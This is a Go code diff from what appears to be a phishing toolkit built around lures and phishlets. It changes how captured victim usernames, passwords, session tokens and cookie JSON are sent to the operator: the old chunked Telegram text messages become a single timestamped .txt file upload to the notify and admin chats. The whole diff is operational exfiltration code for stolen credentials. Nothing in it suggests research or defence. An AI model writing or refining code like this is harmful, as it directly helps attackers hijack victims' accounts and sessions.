@@ -942,8 +942,9 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 		"Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
 		uname, pass, sessionVal, cookieJSON)
 
+	filename := fmt.Sprintf("session_%s.txt", time.Now().Format("20060102_150405"))
 	for chatId := range notifyChats {
-		GlobalBot.sendPlain(chatId, msg)
+		GlobalBot.sendAsFile(chatId, filename, msg)
 	}
 }
 
@@ -1009,7 +1010,8 @@ func NotifySessionFromDB(sess *database.Session) {
 		"Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
 		uname, pass, sessionVal, cookieJSON)
 
-	GlobalBot.sendPlain(adminChatId, msg)
+	filename := fmt.Sprintf("session_%s.txt", time.Now().Format("20060102_150405"))
+	GlobalBot.sendAsFile(adminChatId, filename, msg)
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -1075,17 +1077,12 @@ func (b *TelegramBot) send(chatId int64, text string) {
 	}
 }
 
-func (b *TelegramBot) sendPlain(chatId int64, text string) {
-	const maxLen = 4096
-	for len(text) > 0 {
-		chunk := text
-		if len(chunk) > maxLen {
-			chunk = text[:maxLen]
-		}
-		text = text[len(chunk):]
-		m := tgbotapi.NewMessage(chatId, chunk)
-		if _, err := b.api.Send(m); err != nil {
-			log.Error("telegram bot: send to %d: %v", chatId, err)
-		}
+func (b *TelegramBot) sendAsFile(chatId int64, filename, text string) {
+	doc := tgbotapi.NewDocumentUpload(chatId, tgbotapi.FileBytes{
+		Name:  filename,
+		Bytes: []byte(text),
+	})
+	if _, err := b.api.Send(doc); err != nil {
+		log.Error("telegram bot: send file to %d: %v", chatId, err)
 	}
 }
